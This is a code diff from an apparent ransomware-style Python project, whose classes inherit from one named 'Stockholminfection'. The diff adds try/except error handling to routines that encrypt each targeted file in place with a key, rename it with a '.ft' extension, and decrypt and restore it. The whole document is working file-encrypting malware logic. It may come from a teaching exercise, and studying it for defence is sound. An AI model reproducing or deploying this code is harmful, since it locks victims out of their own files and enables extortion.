@@ -72,17 +72,21 @@ class Encryptation(Stockholminfection):
             self.logger.logger.info("Nothing to cipher")
         for file in self.files:
             self.logger.logger.info("Ciphering " + file)
-            #try:
-            with open(file, 'rb') as textfile:
-                data_to_encrypt = textfile.read()
-                textfile.close()
-            with open(file, 'wb') as cipheredfile:
-                cipheredfile.write(encrypt_manual(data_to_encrypt, self.key))
-            os.rename(file, file + ".ft")
-            self.logger.logger.info("Successfully encrypted " + file + " !!!\n")
-            #except Exception:
-            #    cipheredfile.close()
-            #    self.logger.logger.error("Unable to encrypt " + file + " :( \n")
+            try:
+                with open(file, 'rb') as textfile:
+                    data_to_encrypt = textfile.read()
+                    textfile.close()
+                try:
+                    encrypted = encrypt_manual(data_to_encrypt, self.key)
+                except Exception:
+                    self.logger.logger.error("encryption fails " + file)
+                with open(file, 'wb') as cipheredfile:
+                    cipheredfile.write(encrypted)
+                    cipheredfile.close()
+                os.rename(file, file + ".ft")
+                self.logger.logger.info("Successfully encrypted " + file + " !!!\n")
+            except Exception:
+                self.logger.logger.error("Unable to encrypt " + file + " :( \n")
 
 class Desencryptation(Stockholminfection):
     """Inherited class to encrypt"""
@@ -108,14 +112,19 @@ class Desencryptation(Stockholminfection):
             self.logger.logger.info("Nothing to decrypt")
         for file in self.files:
             self.logger.logger.info("Decrypting " + file)
-            #try:
-            with open(file, 'rb') as textfile:
-                data_to_decrypt = textfile.read()
-                textfile.close()
-            with open(file, 'wb') as uncipheredfile:
-                uncipheredfile.write(decrypt_manual(data_to_decrypt, self.key))
-            os.rename(file, file.split(".ft")[0])
-            self.logger.logger.info("Successfully decrypt " + file + " !!!\n")
-            #except Exception:
-            #    uncipheredfile.close()
-            #    self.logger.logger.error("Unable to decrypt " + file + " :( \n")
+            try:
+                with open(file, 'rb') as textfile:
+                    data_to_decrypt = textfile.read()
+                    textfile.close()
+                try:
+                    decrypt_message = decrypt_manual(data_to_decrypt, self.key)
+                except Exception:
+                    self.logger.logger.error("decryption fails " + file)
+                with open(file, 'wb') as uncipheredfile:
+                    uncipheredfile.write(decrypt_message)
+                    uncipheredfile.close()
+                os.rename(file, file.split(".ft")[0])
+                self.logger.logger.info("Successfully decrypt " + file + " !!!\n")
+            except Exception:
+                uncipheredfile.close()
+                self.logger.logger.error("Unable to decrypt " + file + " :( \n")
